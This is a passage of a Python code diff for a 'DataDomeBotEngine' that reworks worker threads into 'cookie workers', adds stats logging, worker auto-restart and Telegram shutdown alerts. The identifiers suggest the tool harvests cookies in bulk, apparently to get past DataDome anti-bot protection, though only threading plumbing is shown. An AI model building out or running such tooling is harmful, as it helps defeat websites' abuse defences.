-                                s = self.stats.get_stats()
-                                logger.info(
-                                    f"[BOT] 📊 {s['fetched']} fetched | {s['updated']} updated | "
-                                    f"{s['failed']} failed | avg: {s['avg_latency_ms']}ms"
-                                )
-
-                except Exception as e:
-                    # ── CRITICAL: never let an exception kill a worker thread ──
-                    # Without this, one unexpected error = worker gone forever.
-                    consecutive_errors += 1
-                    logger.warning(f"[WORKER-{thread_id}] Unhandled error (#{consecutive_errors}): {e}")
-                    if consecutive_errors >= 10:
-                        # Too many consecutive errors — brief cooldown then reset
-                        logger.warning(f"[WORKER-{thread_id}] 10 consecutive errors — cooling down 5s...")
-                        self.shutdown_event.wait(5)
-                        consecutive_errors = 0
-                    else:
-                        # Small sleep to avoid tight error loop hammering CPU
-                        self.shutdown_event.wait(0.5)
-
-        # ── Use daemon threads instead of ThreadPoolExecutor ──
-        # ThreadPoolExecutor: kapag nag-crash ang future, wala itong auto-restart.
-        # Daemon threads: kahit may error, ang main loop ay hindi affected.
         worker_threads = []
-        for i in range(NUM_WORKERS):
+        for i, worker in enumerate(self.cookie_workers):
             t = threading.Thread(
-                target=worker_loop, args=(i,),
-                name=f"ddworker-{i}", daemon=True
+                target=worker.run_loop,
+                args=(self.shutdown_event,),
+                name=f"cookie-worker-{i}",
+                daemon=True,
             )
             t.start()
             worker_threads.append(t)
 
-        logger.info(f"[BOT] ✅ {NUM_WORKERS} worker threads started")
+        logger.info(f"[BOT] ✅ {NUM_WORKERS} cookie worker threads started")
+
+        # ── Stats logger thread — shows worker stats every 30s ──
+        last_stats_log = [time.time()]
+
+        def stats_logger():
+            while not self.shutdown_event.is_set():
+                self.shutdown_event.wait(timeout=30)
+                if self.shutdown_event.is_set():
+                    break
+                now = time.time()
+                if now - last_stats_log[0] >= 30:
+                    last_stats_log[0] = now
+                    total_attempts = sum(w._attempts for w in self.cookie_workers)
+                    total_successes = sum(w._successes for w in self.cookie_workers)
+                    total_failures = sum(w._failures for w in self.cookie_workers)
+                    alive_count = sum(1 for w in self.cookie_workers if w._alive)
+                    cookie_count = len(self.updater.read_all_cookies())
+                    logger.info(
+                        f"[BOT] 📊 Workers: {alive_count}/{NUM_WORKERS} alive | "
+                        f"Attempts: {total_attempts} | ✔ {total_successes} | ✘ {total_failures} | "
+                        f"Cookies: {cookie_count}"
+                    )
+
+        threading.Thread(target=stats_logger, name="stats-logger", daemon=True).start()
 
         # ── Monitor thread — auto-restart any dead worker ──
         def monitor_workers():
@@ -2785,10 +3487,13 @@ class DataDomeBotEngine:
                     break
                 for i, t in enumerate(worker_threads):
                     if not t.is_alive():
-                        logger.warning(f"[MONITOR] Worker-{i} died — restarting...")
+                        logger.warning(f"[MONITOR] Cookie worker-{i} died — restarting...")
+                        worker = self.cookie_workers[i]
                         new_t = threading.Thread(
-                            target=worker_loop, args=(i,),
-                            name=f"ddworker-{i}-restart", daemon=True
+                            target=worker.run_loop,
+                            args=(self.shutdown_event,),
+                            name=f"cookie-worker-{i}-restart",
+                            daemon=True,
                         )
                         new_t.start()
                         worker_threads[i] = new_t
@@ -2799,9 +3504,11 @@ class DataDomeBotEngine:
 
         # Shutdown
         logger.info("[BOT] ⚠ Shutting down...")
-        self.tg.send_important("⚠ DataDome Bot shutting down")
-        s = self.stats.get_stats()
-        logger.info(f"[BOT] 📊 Final: {s['fetched']} fetched | {s['updated']} updated | {s['failed']} failed")
+        self.tg.send_important("⚠ Cookie Bot shutting down")
+        total_successes = sum(w._successes for w in self.cookie_workers)
+        total_attempts = sum(w._attempts for w in self.cookie_workers)
+        cookie_count = len(self.updater.read_all_cookies())
+        logger.info(f"[BOT] 📊 Final: {total_attempts} attempts | {total_successes} cookies obtained | {cookie_count} in file")
         logger.info("[BOT] 👋 Goodbye!")
 
     def _run_api(self):
